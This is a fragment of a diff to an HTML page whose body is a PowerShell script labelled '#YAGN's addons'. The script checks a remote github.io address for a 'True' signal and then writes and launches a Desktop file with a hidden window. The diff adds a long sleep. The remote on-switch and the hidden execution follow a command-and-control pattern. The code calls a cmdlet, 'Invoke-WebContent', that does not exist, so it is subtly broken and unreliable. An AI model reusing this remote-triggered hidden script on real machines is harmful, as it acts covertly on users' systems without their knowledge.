@@ -5,7 +5,7 @@
   </head>
   <body>
 <p>
-  #YAGN's addons
+#YAGN's addons
 $user = $env:USERNAME
 $innerPath1 = "C:\Users\$user\Desktop"
 $innerPath2 = "C:\Program Files"
@@ -195,6 +195,7 @@ $signal = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmote-
 if ($signal -eq "True") {
 Set-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -Value $contents
 Start-Process -FilePath "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -WindowStyle Hidden
+Start-Sleep -Seconds 6060
 }
 }
 </p>
